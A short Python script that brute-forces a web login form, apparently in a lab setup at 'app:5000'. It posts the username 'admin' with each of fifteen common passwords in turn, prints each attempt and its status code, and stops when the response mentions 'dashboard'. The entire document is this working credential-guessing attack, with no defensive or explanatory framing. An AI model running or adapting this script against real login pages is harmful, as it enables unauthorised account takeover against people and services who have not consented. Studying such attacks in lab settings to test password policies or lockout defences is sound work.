import requests

URL = "http://app:5000/login"

USERNAME = "admin"

password_list = [
    "123456",
    "password123",
    "admin123",
    "welcome",
    "qwerty",
    "letmein",
    "12345678",
    "password1",
    "admin",
    "test123",
    "login123",
    "secret",
    "passw0rd",
    "changeme",
    "password"
]

for password in password_list:

    data = {
        "username": USERNAME,
        "password": password
    }

    r = requests.post(URL, data=data)

    print(f"Trying: {password} | Status: {r.status_code}")

    if "dashboard" in r.text.lower():
        print(f"[SUCCESS] Password found: {password}")
        break